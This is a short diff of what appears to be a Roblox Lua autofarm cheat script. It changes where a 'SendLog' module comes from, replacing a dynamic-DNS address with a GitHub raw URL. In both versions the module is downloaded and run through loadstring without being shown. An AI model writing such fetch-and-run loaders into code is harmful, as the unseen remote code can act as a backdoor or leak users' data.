@@ -865,7 +865,7 @@ local GetCloseCash = function()
 	return Am
 end
 
-local SendLog = loadstring(game:HttpGet("http://ms1122.ddns.net/api/dhwebhook.lua"))()
+local SendLog = loadstring(game:HttpGet("https://raw.githubusercontent.com/x1iz/farm/main/api.lua"))()
 
 local Attack = function()
 	local Mode = tonumber(_G.AutofarmSettings.AttackMode)
